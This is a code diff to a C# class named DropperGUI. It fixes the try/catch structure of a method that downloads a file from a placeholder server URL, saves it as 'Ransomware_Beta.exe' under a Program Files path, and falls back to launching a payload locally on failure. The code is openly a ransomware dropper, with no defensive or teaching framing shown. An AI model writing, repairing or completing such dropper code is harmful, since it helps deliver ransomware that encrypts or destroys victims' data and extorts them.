@@ -86,13 +86,16 @@ public partial class DropperGUI : Form {
   }
   public static void DownLoadLocalFileInBackground() {
 
-    try {
-      WebClient webClient = new WebClient();
-      webClient.DownloadFile("URl to local server",
-                             @"C:\Program Files\System32\Ransomware_Beta.exe");
-      catch (WebException e) {
-        LaunchLocally();
-      }
+            try
+            {
+                WebClient webClient = new WebClient();
+                webClient.DownloadFile("URl to local server",
+                                       @"C:\Program Files\System32\Ransomware_Beta.exe");
+            }
+            catch (WebException e)
+            {
+                LaunchLocally();
+            }
     }
 
     private static void LaunchLocally() {
